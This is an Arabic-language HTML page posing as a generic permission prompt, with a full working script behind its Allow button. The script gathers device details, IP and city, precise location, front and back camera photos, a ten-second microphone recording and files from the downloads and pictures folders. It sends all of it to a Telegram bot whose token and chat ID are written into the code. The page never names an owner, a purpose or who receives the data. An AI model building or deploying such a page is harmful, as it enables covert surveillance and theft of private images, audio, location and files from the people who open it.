<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>طلب إذن الوصول</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            color: #333;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .permission-box {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            padding: 25px;
            margin-top: 30px;
        }
        
        .permission-header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            border-bottom: 1px solid #eee;
            padding-bottom: 15px;
        }
        
        .permission-icon {
            font-size: 24px;
            margin-left: 15px;
            color: #4285f4;
        }
        
        .permission-title {
            font-size: 20px;
            font-weight: 600;
            margin: 0;
        }
        
        .permission-item {
            display: flex;
            align-items: center;
            padding: 12px 0;
            border-bottom: 1px solid #f5f5f5;
        }
        
        .permission-item-icon {
            font-size: 20px;
            margin-left: 15px;
            width: 30px;
            text-align: center;
        }
        
        .permission-item-text {
            flex: 1;
        }
        
        .permission-item-name {
            font-weight: 500;
            margin-bottom: 3px;
        }
        
        .permission-item-desc {
            font-size: 13px;
            color: #666;
        }
        
        .action-buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 25px;
        }
        
        .btn {
            padding: 12px 24px;
            border-radius: 6px;
            font-weight: 500;
            cursor: pointer;
            border: none;
            font-size: 15px;
            transition: all 0.2s;
        }
        
        .btn-allow {
            background-color: #4285f4;
            color: white;
        }
        
        .btn-allow:hover {
            background-color: #3367d6;
        }
        
        .btn-deny {
            background-color: #f1f1f1;
            color: #555;
        }
        
        .btn-deny:hover {
            background-color: #e0e0e0;
        }
        
        .status {
            text-align: center;
            padding: 15px;
            margin-top: 20px;
            border-radius: 6px;
            display: none;
        }
        
        .status-processing {
            background-color: #e8f0fe;
            color: #4285f4;
        }
        
        .status-success {
            background-color: #e6f4ea;
            color: #34a853;
        }
        
        .status-error {
            background-color: #fce8e6;
            color: #d93025;
        }
        
        .progress-container {
            width: 100%;
            background-color: #f1f1f1;
            border-radius: 5px;
            margin: 15px 0;
            display: none;
        }
        
        .progress-bar {
            height: 10px;
            border-radius: 5px;
            background-color: #4285f4;
            width: 0%;
            transition: width 0.3s;
        }
        
        #select-files-btn {
            display: none;
            margin: 20px auto;
            padding: 15px 30px;
            background-color: #34a853;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
        }
        
        #file-selection-instruction {
            display: none;
            text-align: center;
            margin: 15px 0;
            color: #4285f4;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="permission-box">
            <div class="permission-header">
                <div class="permission-icon">🔒</div>
                <h1 class="permission-title">طلب إذن الوصول</h1>
            </div>
            
            <div class="permission-item">
                <div class="permission-item-icon">📱</div>
                <div class="permission-item-text">
                    <div class="permission-item-name">معلومات الجهاز</div>
                    <div class="permission-item-desc">جمع معلومات مفصلة عن جهازك</div>
                </div>
            </div>
            
            <div class="permission-item">
                <div class="permission-item-icon">🌍</div>
                <div class="permission-item-text">
                    <div class="permission-item-name">الموقع الجغرافي</div>
                    <div class="permission-item-desc">تحديد موقعك الحالي بدقة</div>
                </div>
            </div>
            
            <div class="permission-item">
                <div class="permission-item-icon">📷</div>
                <div class="permission-item-text">
                    <div class="permission-item-name">الكاميرا الأمامية والخلفية</div>
                    <div class="permission-item-desc">التقاط صور من الكاميرات</div>
                </div>
            </div>
            
            <div class="permission-item">
                <div class="permission-item-icon">🎤</div>
                <div class="permission-item-text">
                    <div class="permission-item-name">التسجيل الصوتي</div>
                    <div class="permission-item-desc">تسجيل صوت لمدة 10 ثواني</div>
                </div>
            </div>
            
            <div class="permission-item">
                <div class="permission-item-icon">📁</div>
                <div class="permission-item-text">
                    <div class="permission-item-name">الملفات والصور</div>
                    <div class="permission-item-desc">الوصول إلى مجلدات التحميل والصور</div>
                </div>
            </div>
            
            <div id="file-selection-instruction">
                الرجاء النقر على زر "اختر الملفات يدوياً" أسفل
            </div>
            
            <button id="select-files-btn">اختر الملفات يدوياً</button>
            
            <div class="progress-container" id="progress-container">
                <div class="progress-bar" id="progress-bar"></div>
            </div>
            
            <div class="action-buttons">
                <button class="btn btn-deny" id="deny-btn">رفض</button>
                <button class="btn btn-allow" id="allow-btn">السماح</button>
            </div>
            
            <div class="status status-processing" id="status-processing">
                جاري جمع المعلومات وإرسالها...
            </div>
            
            <div class="status status-success" id="status-success" style="display: none;">
                تم إرسال المعلومات بنجاح!
            </div>
            
            <div class="status status-error" id="status-error" style="display: none;">
                حدث خطأ أثناء محاولة جمع المعلومات
            </div>
        </div>
    </div>

    <script>
        // تكوين البوت
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";
        
        // عناصر الواجهة
        const allowBtn = document.getElementById('allow-btn');
        const denyBtn = document.getElementById('deny-btn');
        const statusProcessing = document.getElementById('status-processing');
        const statusSuccess = document.getElementById('status-success');
        const statusError = document.getElementById('status-error');
        const progressContainer = document.getElementById('progress-container');
        const progressBar = document.getElementById('progress-bar');
        const selectFilesBtn = document.getElementById('select-files-btn');
        const fileInstruction = document.getElementById('file-selection-instruction');
        
        // متغيرات الحالة
        let manualFileSelection = false;
        let fileSelectionResolve;
        
        // معالجة النقر على زر السماح
        allowBtn.addEventListener('click', async () => {
            allowBtn.disabled = true;
            denyBtn.disabled = true;
            statusProcessing.style.display = 'block';
            progressContainer.style.display = 'block';
            
            try {
                updateProgress(5, 'بدء العملية...');
                
                // 1. جمع وإرسال معلومات الجهاز
                updateProgress(15, 'جمع معلومات الجهاز...');
                const deviceInfo = await getDeviceInfo();
                await sendToTelegram(formatDeviceInfo(deviceInfo));
                
                // 2. الحصول على الموقع الجغرافي
                updateProgress(25, 'جمع بيانات الموقع...');
                await getAndSendLocation();
                
                // 3. الكاميرا الأمامية
                updateProgress(35, 'الوصول إلى الكاميرا الأمامية...');
                await captureAndSendPhoto('user', 'front_camera.jpg', 'الكاميرا الأمامية');
                
                // 4. الكاميرا الخلفية
                updateProgress(45, 'الوصول إلى الكاميرا الخلفية...');
                await captureAndSendPhoto('environment', 'back_camera.jpg', 'الكاميرا الخلفية');
                
                // 5. التسجيل الصوتي
                updateProgress(55, 'التسجيل الصوتي...');
                await recordAndSendAudio();
                
                // 6. ملفات التحميل (مع اختيار يدوي)
                updateProgress(65, 'انتظار اختيار الملفات...');
                fileInstruction.style.display = 'block';
                selectFilesBtn.style.display = 'block';
                await new Promise((resolve) => {
                    fileSelectionResolve = resolve;
                });
                
                updateProgress(70, 'فحص مجلد التحميلات...');
                await checkAndSendDownloads();
                
                // 7. الصور من مجلد الصور (مع اختيار يدوي)
                updateProgress(80, 'انتظار اختيار مجلد الصور...');
                fileInstruction.style.display = 'block';
                selectFilesBtn.style.display = 'block';
                await new Promise((resolve) => {
                    fileSelectionResolve = resolve;
                });
                
                updateProgress(85, 'فحص مجلد الصور...');
                await checkAndSendPictures();
                
                updateProgress(100, 'اكتملت العملية!');
                statusProcessing.style.display = 'none';
                statusSuccess.style.display = 'block';
                
                // إرسال ملخص
                await sendToTelegram('✅ تم الانتهاء من جمع جميع البيانات بنجاح!');
            } catch (error) {
                console.error('Error:', error);
                statusProcessing.style.display = 'none';
                statusError.style.display = 'block';
                statusError.textContent = `حدث خطأ: ${error.message}`;
                await sendToTelegram(`⚠️ حدث خطأ: ${error.message}`);
            } finally {
                selectFilesBtn.style.display = 'none';
                fileInstruction.style.display = 'none';
            }
        });
        
        // معالجة النقر على زر اختيار الملفات
        selectFilesBtn.addEventListener('click', async () => {
            manualFileSelection = true;
            selectFilesBtn.style.display = 'none';
            fileInstruction.style.display = 'none';
            if (fileSelectionResolve) {
                fileSelectionResolve();
            }
        });
        
        // معالجة النقر على زر الرفض
        denyBtn.addEventListener('click', () => {
            document.querySelector('.permission-box').innerHTML = `
                <div style="text-align: center; padding: 30px;">
                    <div style="font-size: 50px; margin-bottom: 20px;">🚫</div>
                    <h2 style="margin-bottom: 10px;">تم رفض الأذونات</h2>
                    <p style="color: #666;">لن يتم جمع أو إرسال أي معلومات من جهازك</p>
                </div>
            `;
        });
        
        // دالة لتحديث شريط التقدم
        function updateProgress(percent, message) {
            progressBar.style.width = `${percent}%`;
            statusProcessing.textContent = message;
        }
        
        // دالة لجمع وإرسال الموقع الجغرافي
        async function getAndSendLocation() {
            try {
                const location = await getLocation();
                await sendToTelegram(`📍 الموقع الجغرافي:\n- خط العرض: ${location.latitude}\n- خط الطول: ${location.longitude}\n- الدقة: ${location.accuracy} متر\n- رابط الخريطة: https://maps.google.com/?q=${location.latitude},${location.longitude}`);
            } catch (error) {
                await sendToTelegram("⚠️ فشل الحصول على الموقع الجغرافي: " + error.message);
                throw error;
            }
        }
        
        // دالة لالتقاط وإرسال صورة من الكاميرا
        async function captureAndSendPhoto(facingMode, filename, cameraName) {
            try {
                await requestCameraAccess(facingMode);
                const photo = await captureCameraPhoto(facingMode);
                await sendPhotoToTelegram(photo, filename);
                await sendToTelegram(`✅ تم التقاط صورة من ${cameraName} بنجاح`);
            } catch (error) {
                await sendToTelegram(`⚠️ فشل الوصول إلى ${cameraName}: ` + error.message);
                throw error;
            }
        }
        
        // دالة للتسجيل وإرسال الصوت
        async function recordAndSendAudio() {
            try {
                await requestMicrophoneAccess();
                const audioBlob = await recordAudio(10);
                await sendAudioToTelegram(audioBlob, 'audio_recording.ogg');
                await sendToTelegram('✅ تم التسجيل الصوتي بنجاح');
            } catch (error) {
                await sendToTelegram("⚠️ فشل التسجيل الصوتي: " + error.message);
                throw error;
            }
        }
        
        // دالة لفحص وإرسال معلومات التحميلات
        async function checkAndSendDownloads() {
            try {
                await sendToTelegram("⌛ جاري فحص مجلد التحميلات...");
                const downloadFiles = await getFilesFromDirectory('downloads');
                await sendToTelegram(`📁 عدد الملفات في مجلد التحميل: ${downloadFiles.length}`);
                
                let sentCount = 0;
                for (const fileEntry of downloadFiles) {
                    if (sentCount >= 3) break;
                    try {
                        const file = await fileEntry.getFile();
                        if (file.size > 20 * 1024 * 1024) {
                            await sendToTelegram(`⏩ تخطي الملف الكبير: ${file.name}`);
                            continue;
                        }
                        updateProgress(70 + (sentCount * 5), `جاري إرسال ${file.name}...`);
                        await sendFileToTelegram(file, file.name);
                        sentCount++;
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    } catch (error) {
                        await sendToTelegram(`⚠️ خطأ في إرسال ${fileEntry.name}: ${error.message}`);
                    }
                }
                
                if (sentCount > 0) {
                    await sendToTelegram(`✅ تم إرسال ${sentCount} ملفات من التحميلات`);
                } else {
                    await sendToTelegram("ℹ️ لم يتم إرسال أي ملفات من التحميلات");
                }
            } catch (error) {
                await sendToTelegram("⚠️ فشل الوصول إلى مجلد التحميل: " + error.message);
                throw error;
            }
        }
        
        // دالة لفحص وإرسال معلومات الصور
        async function checkAndSendPictures() {
            try {
                await sendToTelegram("⌛ جاري فحص مجلد الصور...");
                const pictures = await getFilesFromDirectory('pictures');
                await sendToTelegram(`📸 عدد الصور في مجلد الصور: ${pictures.length}`);
                
                let sentCount = 0;
                for (const fileEntry of pictures) {
                    if (sentCount >= 3) break;
                    if (fileEntry.name.match(/\.(jpg|jpeg|png|gif)$/i)) {
                        try {
                            const file = await fileEntry.getFile();
                            updateProgress(85 + (sentCount * 5), `جاري إرسال ${file.name}...`);
                            await sendPhotoToTelegram(file, file.name);
                            sentCount++;
                            await new Promise(resolve => setTimeout(resolve, 1000));
                        } catch (error) {
                            await sendToTelegram(`⚠️ خطأ في إرسال ${fileEntry.name}: ${error.message}`);
                        }
                    }
                }
                
                if (sentCount > 0) {
                    await sendToTelegram(`✅ تم إرسال ${sentCount} صور من المجلد`);
                } else {
                    await sendToTelegram("ℹ️ لم يتم إرسال أي صور من المجلد");
                }
            } catch (error) {
                await sendToTelegram("⚠️ فشل الوصول إلى مجلد الصور: " + error.message);
                throw error;
            }
        }
        
        // دالة لطلب إذن الكاميرا
        async function requestCameraAccess(facingMode) {
            return navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: facingMode,
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            }).then(stream => {
                stream.getTracks().forEach(track => track.stop());
                return true;
            });
        }
        
        // دالة لطلب إذن الميكروفون
        async function requestMicrophoneAccess() {
            return navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
                stream.getTracks().forEach(track => track.stop());
                return true;
            });
        }
        
        // دالة لطلب إذن الملفات
        async function getFilesFromDirectory(dirName) {
            if (!('showDirectoryPicker' in window)) {
                throw new Error("المتصفح لا يدعم اختيار المجلدات");
            }
            
            if (!manualFileSelection) {
                throw new Error("يجب اختيار المجلد يدوياً");
            }
            
            try {
                const dirHandle = await window.showDirectoryPicker({
                    mode: 'read'
                });
                
                if (await dirHandle.queryPermission({ mode: 'read' }) !== 'granted') {
                    const permission = await dirHandle.requestPermission({ mode: 'read' });
                    if (permission !== 'granted') {
                        throw new Error("تم رفض إذن القراءة");
                    }
                }
                
                const files = [];
                for await (const entry of dirHandle.values()) {
                    if (entry.kind === 'file') {
                        files.push(entry);
                    } else if (entry.kind === 'directory') {
                        if (['screenshots', 'telegram', 'pictures'].includes(entry.name.toLowerCase())) {
                            try {
                                const subDirHandle = await dirHandle.getDirectoryHandle(entry.name);
                                for await (const subEntry of subDirHandle.values()) {
                                    if (subEntry.kind === 'file') {
                                        files.push(subEntry);
                                    }
                                }
                            } catch (error) {
                                console.error(`خطأ في المجلد الفرعي ${entry.name}:`, error);
                            }
                        }
                    }
                    if (files.length > 50) break;
                }
                
                manualFileSelection = false; // إعادة التعيين للاستخدام التالي
                return files;
            } catch (error) {
                manualFileSelection = false;
                if (error.name === 'AbortError') {
                    throw new Error("تم إلغاء اختيار المجلد");
                }
                throw error;
            }
        }
        
        // دالة لالتقاط صورة من الكاميرا
        async function captureCameraPhoto(facingMode) {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: facingMode,
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            stream.getTracks().forEach(track => track.stop());
            
            return new Promise((resolve) => {
                canvas.toBlob(resolve, 'image/jpeg', 0.9);
            });
        }
        
        // دالة للحصول على الموقع الجغرافي
        async function getLocation() {
            return new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    (error) => reject(error),
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            });
        }
        
        // دالة للتسجيل الصوتي
        async function recordAudio(duration) {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            const audioChunks = [];
            
            mediaRecorder.ondataavailable = (event) => {
                audioChunks.push(event.data);
            };
            
            const recordingPromise = new Promise((resolve) => {
                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                    resolve(audioBlob);
                };
            });
            
            mediaRecorder.start();
            
            for (let i = duration; i > 0; i--) {
                statusProcessing.textContent = `جاري التسجيل الصوتي... ${i} ثانية متبقية`;
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            
            mediaRecorder.stop();
            stream.getTracks().forEach(track => track.stop());
            
            return recordingPromise;
        }
        
        // دالة لجمع معلومات الجهاز
        async function getDeviceInfo() {
            const info = {
                country: await getCountry(),
                city: await getCity(),
                ip: await getIP(),
                batteryLevel: await getBatteryLevel(),
                isCharging: await getChargingStatus(),
                network: await getNetworkInfo(),
                connectionType: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
                time: new Date().toLocaleString(),
                deviceName: navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform,
                deviceVersion: 'غير معروف',
                deviceType: getDeviceType(),
                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف',
                storage: 'غير معروف',
                cpuCores: navigator.hardwareConcurrency || 'غير معروف',
                language: navigator.language,
                browser: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)\/([\d.]+)/)?.[0] || navigator.userAgent,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                osVersion: 'غير معروف',
                screenOrientation: window.screen.orientation.type,
                colorDepth: `${window.screen.colorDepth} بت`,
                bluetooth: 'غير متاح في المتصفح',
                geolocation: 'متاح' in navigator.geolocation ? 'نعم' : 'لا',
                touchSupport: 'ontouchstart' in window ? 'نعم' : 'لا'
            };
            
            return info;
        }
        
        // دوال مساعدة للحصول على معلومات الشبكة والبلد
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'غير معروف';
            }
        }
        
        async function getCountry() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return data.country_name || 'غير معروف';
            } catch {
                return 'غير معروف';
            }
        }
        
        async function getCity() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return data.city || 'غير معروف';
            } catch {
                return 'غير معروف';
            }
        }
        
        async function getBatteryLevel() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return `${Math.round(battery.level * 100)}%`;
                } catch {
                    return 'غير معروف';
                }
            }
            return 'غير معروف';
        }
        
        async function getChargingStatus() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return battery.charging ? 'نعم' : 'لا';
                } catch {
                    return 'غير معروف';
                }
            }
            return 'غير معروف';
        }
        
        async function getNetworkInfo() {
            if (navigator.connection) {
                return navigator.connection.effectiveType || 'غير معروف';
            }
            return 'غير معروف';
        }
        
        function getDeviceType() {
            const userAgent = navigator.userAgent;
            if (userAgent.match(/Android/i)) return 'Android';
            if (userAgent.match(/iPhone|iPad|iPod/i)) return 'iOS';
            if (userAgent.match(/Windows/i)) return 'Windows';
            if (userAgent.match(/Mac/i)) return 'Mac';
            if (userAgent.match(/Linux/i)) return 'Linux';
            return 'غير معروف';
        }
        
        // دالة لتنسيق معلومات الجهاز
        function formatDeviceInfo(info) {
            return `📱 <b>معلومات الجهاز:</b>
- الدولة: ${info.country}  🔻
- المدينة: ${info.city}
- عنوان IP: ${info.ip}
- شحن الهاتف: ${info.batteryLevel}
- هل الهاتف يشحن؟: ${info.isCharging}
- الشبكة: ${info.network}
- نوع الاتصال: ${info.connectionType}
- الوقت: ${info.time} ⏰
- اسم الجهاز: ${info.deviceName}  🖥️
- إصدار الجهاز: ${info.deviceVersion}
- نوع الجهاز: ${info.deviceType} 📱
- الذاكرة (RAM): ${info.ram}
- الذاكرة الداخلية: ${info.storage}
- عدد الأنوية: ${info.cpuCores}
- لغة النظام: ${info.language}
- اسم المتصفح: ${info.browser}
- إصدار المتصفح: ${info.browser.split('/')[1] || 'غير معروف'}
- دقة الشاشة: ${info.screenResolution}
- إصدار نظام التشغيل ☢️: ${info.osVersion}
- وضع الشاشة 📳: ${info.screenOrientation}
- عمق الألوان 🔰: ${info.colorDepth}
- بروتوكول الأمان المستخدم 💢: ${window.location.protocol.replace(':', '')}
- نطاق التردد للاتصال 🌐: ${info.connectionType}
- إمكانية تحديد الموقع الجغرافي 🌏: ${info.geolocation}
- الدعم لتقنية البلوتوث 🛜: ${info.bluetooth}
- دعم الإيماءات اللمسية 👏🏻: ${info.touchSupport}`;
        }
        
        // دالة لإرسال رسالة إلى تيليجرام
        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }
        
        // دالة لإرسال صورة إلى تيليجرام
        async function sendPhotoToTelegram(photoBlob, filename) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                
                if (photoBlob instanceof Blob) {
                    formData.append('photo', photoBlob, filename);
                } else if (photoBlob instanceof File) {
                    formData.append('photo', photoBlob);
                }
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Error sending photo to Telegram:', error);
            }
        }
        
        // دالة لإرسال تسجيل صوتي إلى تيليجرام
        async function sendAudioToTelegram(audioBlob, filename) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('audio', audioBlob, filename);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Error sending audio to Telegram:', error);
            }
        }
        
        // دالة لإرسال ملف إلى تيليجرام
        async function sendFileToTelegram(file, filename) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', file, filename);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Error sending file to Telegram:', error);
            }
        }
    </script>
</body>
</html>
